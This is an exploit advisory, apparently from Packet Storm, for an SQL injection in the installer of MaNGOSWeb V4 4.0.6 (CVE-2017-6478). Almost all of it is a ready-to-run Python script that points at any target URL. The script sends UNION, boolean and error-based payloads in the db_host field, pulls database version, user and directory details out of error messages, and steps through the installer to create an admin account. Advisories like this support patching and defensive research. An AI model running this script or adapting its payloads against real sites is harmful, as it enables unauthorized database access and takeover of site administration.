@@ -1,0 +1,211 @@
+=============================================================================================================================================
+| # Title     : MaNGOSWeb V4 4.0.6 Sql Injection                                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/paintballrefjosh/MaNGOSWebV4/blob/master/install/index.php                                               |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212429/ &	CVE-2017-6478
+
+[+] Summary : MaNGOSWebV4 version 4.0.6 suffers from a Sql injection vulnerability.
+
+[+]  POC : 
+
+#!/usr/bin/env python3
+"""
+Usage: python3 poc.py https://target.com
+"""
+import requests
+import sys
+import warnings
+from urllib3.exceptions import InsecureRequestWarning
+
+# Suppress SSL warnings
+warnings.filterwarnings('ignore', category=InsecureRequestWarning)
+
+def exploit_sqli(target_url):
+    """Exploit SQL injection to steal database data"""
+    
+    # Create session with SSL verification disabled
+    session = requests.Session()
+    session.verify = False  # Disable SSL verification
+    
+    try:
+        # Step 1: Access installer
+        session.get(f"{target_url}/install/index.php?step=1")
+        
+        # Step 2
+        session.get(f"{target_url}/install/index.php?step=2")
+        
+        # Step 3
+        session.get(f"{target_url}/install/index.php?step=3")
+        
+        # Exploitation in Step 4
+        payload = {
+            'db_host': "localhost' UNION SELECT version(),user(),database(),@@datadir,'injected'-- -",
+            'db_port': '3306',
+            'db_username': 'root',
+            'db_password': 'test',
+            'db_name': 'realmd'
+        }
+        
+        response = session.post(f"{target_url}/install/index.php?step=4", data=payload)
+        
+        # Extract information from error message
+        if "MySql error log" in response.text:
+            start = response.text.find("MySql error log:<br />") + 22
+            end = response.text.find("</div>", start)
+            error_msg = response.text[start:end]
+            
+            print("[+] Database information leaked:")
+            print(f"    {error_msg}")
+            
+            return True
+            
+    except requests.exceptions.SSLError as e:
+        print(f"[!] SSL Error: {e}")
+        print("[*] Trying with verify=False...")
+        return False
+        
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+    
+    return False
+
+def create_admin_account(target_url, username, password):
+    """Create admin account remotely"""
+    
+    session = requests.Session()
+    session.verify = False  # Disable SSL verification
+    
+    try:
+        # Navigate through steps
+        for step in range(1, 6):
+            session.get(f"{target_url}/install/index.php?step={step}")
+        
+        # Step 5 data
+        step5_data = {
+            'char_db_host': 'localhost',
+            'char_db_port': '3306',
+            'char_db_username': 'mangos',
+            'char_db_password': 'mangos',
+            'char_db_name': 'characters',
+            'w_db_host': 'localhost',
+            'w_db_port': '3306',
+            'w_db_username': 'mangos',
+            'w_db_password': 'mangos',
+            'w_db_name': 'world',
+            'db_host': 'localhost',
+            'db_port': '3306',
+            'db_name': 'realmd',
+            'db_username': 'mangos',
+            'db_password': 'mangos'
+        }
+        
+        session.post(f"{target_url}/install/index.php?step=5", data=step5_data)
+        
+        # Create account in Step 6
+        step6_data = {
+            'account': username,
+            'pass': password,
+            'pass2': password
+        }
+        
+        response = session.post(f"{target_url}/install/index.php?step=6", data=step6_data)
+        
+        if "Congradulations" in response.text or "Congratulations" in response.text:
+            print(f"[+] Admin account created:")
+            print(f"    Username: {username}")
+            print(f"    Password: {password}")
+            return True
+            
+    except Exception as e:
+        print(f"[!] Error creating account: {e}")
+        return False
+    
+    return False
+
+def simple_sql_injection_test(target_url):
+    """Simple SQL injection test with timeout handling"""
+    
+    print(f"[*] Testing SQL Injection on {target_url}")
+    
+    # Test different payloads
+    payloads = [
+        ("Basic Injection", "localhost' OR '1'='1"),
+        ("Union Injection", "localhost' UNION SELECT 1,2,3,4,5-- -"),
+        ("Error Based", "localhost' AND 1=CONVERT(int, @@version)-- -"),
+    ]
+    
+    session = requests.Session()
+    session.verify = False
+    session.timeout = 10
+    
+    for payload_name, payload in payloads:
+        try:
+            data = {
+                'db_host': payload,
+                'db_port': '3306',
+                'db_username': 'root',
+                'db_password': 'test',
+                'db_name': 'realmd'
+            }
+            
+            response = session.post(f"{target_url}/install/index.php?step=4", 
+                                   data=data, 
+                                   timeout=10)
+            
+            if "error" in response.text.lower() or "mysql" in response.text.lower():
+                print(f"[+] Possible SQL Injection with {payload_name}")
+                return True
+                
+        except requests.exceptions.Timeout:
+            print(f"[!] Timeout with {payload_name}")
+        except Exception as e:
+            print(f"[!] Error with {payload_name}: {e}")
+    
+    return False
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target_url>")
+        print(f"Example: {sys.argv[0]} http://localhost/mangosweb")
+        print(f"Example: {sys.argv[0]} https://127.0.0.1")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    # Add http:// if not present
+    if not target.startswith(('http://', 'https://')):
+        target = 'http://' + target
+    
+    print(f"[*] Targeting: {target}")
+    print(f"[*] SSL Verification: DISABLED")
+    
+    # Test SQL injection
+    if simple_sql_injection_test(target):
+        print("[+] SQL Injection vulnerability detected!")
+    else:
+        print("[-] No SQL Injection detected")
+    
+    # Try to exploit SQL injection
+    print("\n[*] Attempting SQL Injection exploitation...")
+    if exploit_sqli(target):
+        print("[+] SQL Injection exploited successfully")
+    else:
+        print("[-] SQL Injection exploitation failed")
+    
+    # Try to create admin account
+    print("\n[*] Attempting to create admin account...")
+    if create_admin_account(target, "admin", "Admin123!"):
+        print("[+] Admin account created successfully")
+    else:
+        print("[-] Failed to create admin account")
+    
+    print("\n[*] Attack completed")
+	
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
